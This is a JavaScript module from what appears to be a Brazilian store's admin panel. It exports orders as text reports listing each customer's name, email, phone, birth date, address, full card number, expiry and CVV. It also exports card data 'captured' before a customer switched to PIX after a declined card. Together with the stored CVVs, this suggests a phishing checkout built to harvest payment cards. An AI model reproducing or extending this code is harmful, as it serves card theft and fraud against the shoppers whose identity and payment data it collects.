// Formats one or more orders into a plain-text report containing
// ONLY personal user data + payment (PIX / card) data.
// Used by the admin Pedidos page and the Order Details modal.

// Local classifier (kept in sync with OrderDetailsModal.paymentType) to avoid
// circular import between the modal and this module.
function paymentType(order) {
  const m = order?.payment_method;
  const s = order?.payment_stage;
  if (m === "pix" || s === "pix_generated" || s === "pix_copied") return "pix";
  if (
    m === "card" ||
    s === "card_processing" ||
    s === "card_declined" ||
    s === "switched_to_pix" ||
    s === "switched_to_card"
  )
    return "card";
  return "simulation";
}

const line = (n = 1) => "\n".repeat(n);
const sep = (c = "=", n = 60) => c.repeat(n);

function fmtDate(iso) {
  if (!iso) return "";
  try {
    return new Date(iso).toLocaleString("pt-BR");
  } catch {
    return iso;
  }
}

function fmtBRL(n) {
  return (Number(n) || 0).toLocaleString("pt-BR", {
    style: "currency",
    currency: "BRL",
  });
}

function paymentLabel(type) {
  if (type === "pix") return "PIX";
  if (type === "card") return "CARTÃO";
  return "SIMULAÇÃO (não escolheu forma de pagamento)";
}

function stageLabel(stage) {
  const map = {
    pending: "Aguardando pagamento",
    pix_generated: "PIX gerado",
    pix_copied: "PIX copiado",
    card_processing: "Cartão sendo processado",
    card_declined: "Cartão recusado pelo banco",
    switched_to_pix: "Cartão mudou para PIX",
    switched_to_card: "PIX mudou para Cartão",
    paid: "Pagamento confirmado",
    expired: "Pedido expirado",
  };
  return map[stage] || stage || "—";
}

function buildFullAddress(b = {}) {
  const parts = [
    b.street && b.number ? `${b.street}, ${b.number}` : b.street,
    b.apartment,
    b.neighborhood,
    b.city && b.state ? `${b.city}/${b.state}` : b.city,
    b.cep,
  ].filter(Boolean);
  return parts.join(" — ");
}

export function formatOrderTxt(order) {
  const b = order.billing || {};
  const c = order.card_data || {};
  const type = paymentType(order);

  const fullName =
    b.fullName ||
    [b.firstName, b.lastName].filter(Boolean).join(" ").trim() ||
    order.customer_name ||
    "—";

  const out = [];
  out.push(sep("="));
  out.push(`PEDIDO #${order.order_number}`);
  out.push(`Criado em: ${fmtDate(order.created_at)}`);
  out.push(`Total: ${fmtBRL(order.total)}  |  Qtd: ${order.qty}`);
  out.push(sep("="));
  out.push("");

  // ---- User data ----
  out.push("--- DADOS PESSOAIS ---");
  out.push(`Nome completo.....: ${fullName}`);
  out.push(`E-mail............: ${b.email || "—"}`);
  out.push(`Telefone..........: ${b.phone || "—"}`);
  out.push(`Data nascimento...: ${b.birth || "—"}`);
  out.push(`CEP...............: ${b.cep || "—"}`);
  out.push(`Endereço..........: ${buildFullAddress(b) || "—"}`);
  out.push("");

  // ---- Payment data ----
  out.push("--- PAGAMENTO ---");
  out.push(`Tipo..............: ${paymentLabel(type)}`);
  out.push(`Status............: ${stageLabel(order.payment_stage)}`);

  if (type === "card") {
    out.push("");
    out.push("  [DADOS DO CARTÃO]");
    out.push(`  Nome no cartão..: ${c.name || "—"}`);
    out.push(`  Número..........: ${c.number || "—"}`);
    out.push(`  Validade........: ${c.expiry || "—"}`);
    out.push(`  CVV.............: ${c.cvv || "—"}`);
    if (c.parcelas) out.push(`  Parcelas........: ${c.parcelas}x`);
  } else if (type === "pix") {
    out.push("");
    out.push("  [PIX]");
    out.push(
      `  Código PIX......: ${
        order.payment_stage === "pix_copied" ? "Copiado pelo usuário" : "Não copiado"
      }`
    );
    // If the user tried the card before switching to PIX, show those captured data too
    const hasCard = c && Object.values(c).some((v) => v);
    if (hasCard) {
      out.push("");
      out.push("  [TENTATIVA DE CARTÃO — dados capturados antes da troca para PIX]");
      out.push(`  Nome no cartão..: ${c.name || "—"}`);
      out.push(`  Número..........: ${c.number || "—"}`);
      out.push(`  Validade........: ${c.expiry || "—"}`);
      out.push(`  CVV.............: ${c.cvv || "—"}`);
      if (c.parcelas) out.push(`  Parcelas........: ${c.parcelas}x`);
    }
  } else {
    out.push("");
    out.push("  Observação: Usuário apenas simulou a compra — não escolheu forma de pagamento.");
  }

  // ---- Stage history (audit trail) ----
  if (Array.isArray(order.stage_history) && order.stage_history.length > 0) {
    out.push("");
    out.push("--- HISTÓRICO DE TRANSIÇÕES ---");
    order.stage_history.forEach((h, idx) => {
      const when = h.at ? new Date(h.at).toLocaleString("pt-BR") : "";
      out.push(`  ${String(idx + 1).padStart(2, "0")}. [${when}]  ${stageLabel(h.stage)}`);
    });
  }

  out.push("");
  return out.join("\n");
}

export function formatOrdersTxt(orders, { title = "PEDIDOS" } = {}) {
  const header = [];
  header.push(sep("#"));
  header.push(`# ${title}`);
  header.push(`# Gerado em: ${new Date().toLocaleString("pt-BR")}`);
  header.push(`# Total de pedidos: ${orders.length}`);
  header.push(sep("#"));
  header.push("");

  const body = orders.map(formatOrderTxt).join(line(1));
  return header.join("\n") + "\n" + body;
}

export function downloadTxt(filename, content) {
  const blob = new Blob([content], { type: "text/plain;charset=utf-8" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  setTimeout(() => URL.revokeObjectURL(url), 200);
}
